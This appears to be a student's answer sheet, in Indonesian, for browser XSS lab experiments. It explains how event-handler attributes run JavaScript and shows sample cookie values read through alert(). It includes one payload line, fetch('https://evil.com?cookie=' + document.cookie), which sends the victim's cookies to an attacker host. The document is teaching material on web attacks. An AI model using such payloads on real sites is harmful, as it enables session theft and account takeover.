Eksperimen 2:
Kenapa ini bekerja padahal tidak ada tag <script>?
Karena:
- Browser mengeksekusi JavaScript di atribut event handler HTML
  (Contohnya: onerror, onclick, onload, dll)
- Atribut ini tetap dianggap kode JavaScript oleh browser
Jadi tanpa tag <script>, JavaScript tetap dieksekusi lewat atribut event.

Eksperimen 3:
Cookie apa yang muncul di alert?
Cookie: sessionTest=hello; persistentTest=world; visitCount=3; sessionId=abc123xyz; username=JohnDoe

Jika attacker mengganti alert() dengan fetch('https://evil.com?cookie=' + document.cookie), apa yang akan terjadi?
- Browser korban akan mengirim request ke evil.com
- Cookie korban dikirim sebagain parameter URL
- Server attacker menerima dan menyimpan cookie
